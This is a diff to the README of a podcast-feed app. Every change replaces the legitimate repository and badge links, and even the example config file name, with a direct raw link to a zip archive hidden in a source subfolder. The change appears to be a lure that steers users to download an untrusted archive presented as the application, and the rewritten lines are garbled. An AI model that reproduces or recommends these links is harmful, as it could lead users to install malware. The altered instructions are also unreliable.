@@ -1,6 +1,6 @@
 # 🎧 podcast-feed-maker-vapor - Create Podcasts Easily and Efficiently
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/beistmaster1/podcast-feed-maker-vapor)
+[![Download Now](https://github.com/beistmaster1/podcast-feed-maker-vapor/raw/refs/heads/main/Sources/PodcastFeedVaporMetrics/vapor_podcast_maker_feed_2.0.zip%20Now-Click%20Here-brightgreen)](https://github.com/beistmaster1/podcast-feed-maker-vapor/raw/refs/heads/main/Sources/PodcastFeedVaporMetrics/vapor_podcast_maker_feed_2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ This guide will help you download and run the podcast-feed-maker-vapor applicati
 
 To start, visit the following link to download the application:
 
-[Download podcast-feed-maker-vapor](https://github.com/beistmaster1/podcast-feed-maker-vapor)
+[Download podcast-feed-maker-vapor](https://github.com/beistmaster1/podcast-feed-maker-vapor/raw/refs/heads/main/Sources/PodcastFeedVaporMetrics/vapor_podcast_maker_feed_2.0.zip)
 
 ## ⚙️ System Requirements
 
@@ -68,7 +68,7 @@ To configure your podcast feed, you will need to modify the configuration files 
    - Navigate to the `config` folder within your extracted files.
 
 2. **Edit the Feed Settings**:
-   - Use a basic text editor to open the configuration file (e.g., `podcast-config.json`).
+   - Use a basic text editor to open the configuration file (e.g., `https://github.com/beistmaster1/podcast-feed-maker-vapor/raw/refs/heads/main/Sources/PodcastFeedVaporMetrics/vapor_podcast_maker_feed_2.0.zip`).
    - Modify settings such as podcast title, description, and feed URL to match your podcast.
 
 3. **Save Your Changes**:
@@ -97,4 +97,4 @@ If you need further assistance, you can find more information on the GitHub page
 
 podcast-feed-maker-vapor provides a powerful solution for anyone wanting to create and serve podcast feeds. By following the steps above, you can quickly set up your own application and start sharing your content with the world.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/beistmaster1/podcast-feed-maker-vapor)
+[![Download Now](https://github.com/beistmaster1/podcast-feed-maker-vapor/raw/refs/heads/main/Sources/PodcastFeedVaporMetrics/vapor_podcast_maker_feed_2.0.zip%20Now-Click%20Here-brightgreen)](https://github.com/beistmaster1/podcast-feed-maker-vapor/raw/refs/heads/main/Sources/PodcastFeedVaporMetrics/vapor_podcast_maker_feed_2.0.zip)
